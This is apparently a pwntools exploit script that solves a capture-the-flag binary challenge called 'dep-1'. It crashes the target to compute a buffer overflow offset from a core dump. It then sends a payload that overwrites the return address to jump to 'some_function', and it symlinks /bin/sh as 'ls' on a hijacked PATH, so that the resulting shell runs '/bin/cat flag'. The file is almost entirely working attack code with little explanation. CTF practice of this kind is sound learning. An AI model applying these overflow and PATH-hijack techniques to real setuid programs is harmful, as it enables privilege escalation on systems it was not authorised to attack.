from pwn import *
import os

DEBUG = False 
file = "./dep-1"

os.symlink("/bin/sh", "./ls")

env = { "PATH":".:$PATH"} 
elf = ELF(file)

# crash the process to get a core file and find the buffer address (still boilerplate)

io = process(file, env=env, setuid=False)
io.sendline(cyclic(10000)) 
io.wait()
core = io.corefile
buffer_address = core.stack.find(cyclic(50))
os.unlink(core.path) 

max_len = cyclic(1000).find(p32(core.eip))

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b 0x0804861b
continue
''')

else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

some_func_addr = elf.symbols["some_function"]

payload = b"A" * max_len + p32(some_func_addr)
io.send(payload)


# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'!', b'/bin/cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
os.unlink("./ls")
